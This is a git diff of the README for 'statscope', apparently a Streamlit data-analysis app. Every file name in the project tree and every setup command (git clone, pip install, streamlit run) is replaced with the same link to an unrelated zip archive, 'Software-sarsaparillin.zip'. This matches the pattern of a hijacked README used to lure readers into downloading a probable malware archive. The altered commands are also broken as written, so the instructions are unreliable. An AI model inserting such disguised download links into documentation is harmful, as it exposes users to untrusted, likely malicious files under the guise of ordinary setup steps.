@@ -58,11 +58,11 @@ Once a file is uploaded, the app:
 
 statscope/
 │
-├── app.py # Main Streamlit app
-├── analyzer.py # Data analysis + PDF generation
-├── visualizer.py # Chart creation functions
-├── requirements.txt # Python dependencies
-└── README.md # Project documentation
+├── https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip # Main Streamlit app
+├── https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip # Data analysis + PDF generation
+├── https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip # Chart creation functions
+├── https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip # Python dependencies
+└── https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip # Project documentation
 
 
 ---
@@ -72,7 +72,7 @@ statscope/
 ### 1️⃣ Clone the repository
 
 ```bash
-git clone https://github.com/your-username/statscope.git
+git clone https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip
 cd simple-data-analyzer
 2️⃣ Create a virtual environment (recommended)
 bash
@@ -83,15 +83,15 @@ venv\Scripts\activate      # Windows
 3️⃣ Install dependencies
 bash
 Copy code
-pip install -r requirements.txt
+pip install -r https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip
 ▶️ Run the App
 bash
 Copy code
-streamlit run app.py
+streamlit run https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip
 The app will open automatically in your browser.
 
 📦 Requirements
-Your requirements.txt should include:
+Your https://github.com/Himanwell/statscope/raw/refs/heads/main/data/Software-sarsaparillin.zip should include:
 
 nginx
 Copy code
